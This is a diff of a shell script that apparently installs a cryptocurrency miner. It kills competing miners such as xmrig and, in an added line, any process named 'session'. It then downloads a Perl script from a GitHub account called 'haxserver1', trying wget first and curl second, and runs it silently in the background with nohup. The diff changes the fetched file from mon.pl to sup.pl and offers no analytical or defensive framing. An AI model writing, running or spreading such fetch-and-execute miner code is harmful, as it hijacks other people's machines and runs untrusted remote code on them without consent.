@@ -31,6 +31,7 @@ echo "Removing other miner if any"
 pkill xmrig
 pkill session_ajqysbe
 pkill session_ajqysbey
+pkill session
 echo "Removing Done!"
 
 # Download the file
@@ -89,26 +90,26 @@ sleep 3
 if ps -p $PID > /dev/null; then
   echo "Process started successfully with PID $PID."
 
-  # Download and run mon.pl
-  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+  # Download and run sup.pl
+  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
   if [ $? -ne 0 ]; then
-    echo "wget failed to download mon.pl. Trying with curl."
-    curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+    echo "wget failed to download sup.pl. Trying with curl."
+    curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
     if [ $? -ne 0 ]; then
-      echo "curl also failed to download mon.pl."
+      echo "curl also failed to download sup.pl."
       exit 1
     else
-      echo "mon.pl downloaded successfully with curl."
+      echo "sup.pl downloaded successfully with curl."
     fi
   else
-    echo "mon.pl downloaded successfully with wget."
+    echo "sup.pl downloaded successfully with wget."
   fi
 
-  nohup perl mon.pl >/dev/null 2>&1 &
+  nohup perl sup.pl >/dev/null 2>&1 &
   if [ $? -eq 0 ]; then
-    echo "mon.pl started successfully."
+    echo "sup.pl started successfully."
   else
-    echo "Failed to start mon.pl."
+    echo "Failed to start sup.pl."
     exit 1
   fi
 
@@ -123,26 +124,26 @@ else
   if ps -p $PID > /dev/null; then
     echo "Process started successfully with alternate method with PID $PID."
 
-    # Download and run mon.pl
-    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+    # Download and run sup.pl
+    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
     if [ $? -ne 0 ]; then
-      echo "wget failed to download mon.pl. Trying with curl."
-      curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl
+      echo "wget failed to download sup.pl. Trying with curl."
+      curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
       if [ $? -ne 0 ]; then
-        echo "curl also failed to download mon.pl."
+        echo "curl also failed to download sup.pl."
         exit 1
       else
-        echo "mon.pl downloaded successfully with curl."
+        echo "sup.pl downloaded successfully with curl."
       fi
     else
-      echo "mon.pl downloaded successfully with wget."
+      echo "sup.pl downloaded successfully with wget."
     fi
 
-    nohup perl mon.pl >/dev/null 2>&1 &
+    nohup perl sup.pl >/dev/null 2>&1 &
     if [ $? -eq 0 ]; then
-      echo "mon.pl started successfully."
+      echo "sup.pl started successfully."
     else
-      echo "Failed to start mon.pl."
+      echo "Failed to start sup.pl."
       exit 1
     fi
 
